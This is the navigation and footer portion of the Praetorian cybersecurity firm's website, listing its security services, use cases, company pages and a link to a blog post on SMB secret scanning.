[ Read More ](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

## Ready to Discuss Your Next Continuous Threat Exposure Management Initiative?

Praetorian’s Offense Security Experts are Ready to Answer Your Questions

[ Get Started ](/contact-us/)

[ ![Praetorian](https://www.praetorian.com/wp-content/uploads/2025/10/praetorian-logo-final-white.svg) ](https://www.praetorian.com)

##### [Praetorian Guard Platform](https://www.praetorian.com/guard)

  * [ Continuous Threat Exposure Management ](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [ Attack Surface Management ](https://www.praetorian.com/guard/attack-surface-management/)
  * [ Vulnerability Management ](/chariot/vulnerability-management/)
  * [ Cyber Threat Intelligence ](/chariot/threat-intelligence/)
  * [ Continuous Penetration Testing ](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [ Breach and Attack Simulation ](https://www.praetorian.com/guard/breach-attack-simulation/)

##### Professional Services

  * [ AI/ML Penetration Testing ](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [ Application Penetration Testing ](/services/application-penetration-testing/)
  * [ Assumed Breached Exercise ](/services/assumed-breached-exercise/)
  * [ Attack Path Mapping ](https://www.praetorian.com/resources/attack-path-mapping/)
  * [ Automotive Penetration Testing ](/services/automotive-penetration-testing/#)
  * [ CI/CD Security Engagement ](/services/ci-cd-security-engagement/)
  * [ Cloud Penetration Testing ](/services/cloud-penetration-testing/)
  * [ IoT Penetration Testing ](/services/iot-penetration-testing/)
  * [ Network Penetration Testing ](/services/network-penetration-testing/)
  * [ NIST CSF Benchmark ](/services/nist-csf-benchmark/)
  * [ Purple Team ](/services/purple-team/)
  * [ Red Team ](/services/red-team/)

##### Use Cases

  * [ Bug Bounty Cost Reduction ](/services/bug-bounty-cost-reduction/)
  * [ FDA Testing and Monitoring ](/services/fda-testing-monitoring/)
  * [ Mergers and Acquisitions ](/services/mergers-acquisitions/)
  * [ Ransomware Prevention ](/services/ransomware-prevention/)
  * [ Rogue IT Identification ](/services/rogue-it-identification/)
  * [ Tool and Vendor Consolidation ](/services/tool-vendor-consolidation/)
  * [ Vendor Risk Management ](https://www.praetorian.com/services/vendor-risk-management/)

##### Company

  * [ About Us ](https://www.praetorian.com/about-us/)
  * [ Leadership Team ](https://www.praetorian.com/leadership-team/)
  * [ Press Releases ](/news/press-release/)
  * [ In the News ](/news/news)
  * [ Contact Us ](https://www.praetorian.com/contact-us/)
  * [ Resource Library ](https://www.praetorian.com/resources/)
  * [ Security Blog ](/blog/)
  * [ People Ops Blog ](/people-ops/)
  * [ Careers ](https://www.praetorian.com/careers/)
  * [ Culture ](https://www.praetorian.com/work-at-praetorian/)
  * [ Survival Kit ](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)

### Subscribe to our Newsletter

Catch our latest exploits, news, articles, and events.

[Privacy Policy](/privacy-policy/) | [Responsible Disclosure Policy](/responsible-disclosure-policy/) | [Terms of Service](/terms-of-service/) | [Terms and Conditions](/terms/)

Copyright © 2025. All Rights Reserved.

[ Linkedin-in ](https://www.linkedin.com/company/praetorian/) [ X-twitter ](https://twitter.com/praetorianlabs) [ Facebook-f ](https://www.facebook.com/praetorianlabs) [ Github ](https://github.com/praetorian-inc) [ Youtube ](https://www.youtube.com/user/PraetorianLabs)
